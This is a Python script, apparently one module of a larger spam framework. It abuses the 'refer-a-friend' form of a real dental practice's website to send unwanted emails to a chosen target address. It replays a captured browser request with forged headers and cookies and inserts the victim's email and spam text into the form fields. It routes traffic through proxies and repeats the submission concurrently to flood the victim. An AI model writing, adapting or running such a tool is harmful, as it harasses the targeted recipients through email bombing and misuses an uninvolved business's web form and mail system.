from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '_ga': 'GA1.2.1539603447.1678105555',
            '_gid': 'GA1.2.351172879.1678105555',
            '_gat_gtag_UA_120049835_1': '1',
            '_gat_gtag_UA_73870813_8': '1',
        }

        headers = {
            'authority': 'franklintndental.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryU9Pu3ze8qsNvNH7u',
            # 'cookie': '_ga=GA1.2.1539603447.1678105555; _gid=GA1.2.351172879.1678105555; _gat_gtag_UA_120049835_1=1; _gat_gtag_UA_73870813_8=1',
            'origin': 'https://franklintndental.com',
            'pragma': 'no-cache',
            'referer': 'https://franklintndental.com/refer-a-friend/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="input_1"\r\n\r\ntest\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="input_6"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="input_2"\r\n\r\ntest\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="input_4"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="input_5"\r\n\r\ntest\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="is_submit_3"\r\n\r\n1\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n3\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="state_3"\r\n\r\nWyJbXSIsImZlN2YzY2U3Zjk0ZThhYWRlY2Y3ZTM0ZDNlYjA5Nzg1Il0=\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="gform_target_page_number_3"\r\n\r\n0\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="gform_source_page_number_3"\r\n\r\n1\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\n3fc1c7d368dbfe7ed04d2a711d924b6d\r\n------WebKitFormBoundaryU9Pu3ze8qsNvNH7u--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post('https://franklintndental.com/refer-a-friend/', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = 'Thank you'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
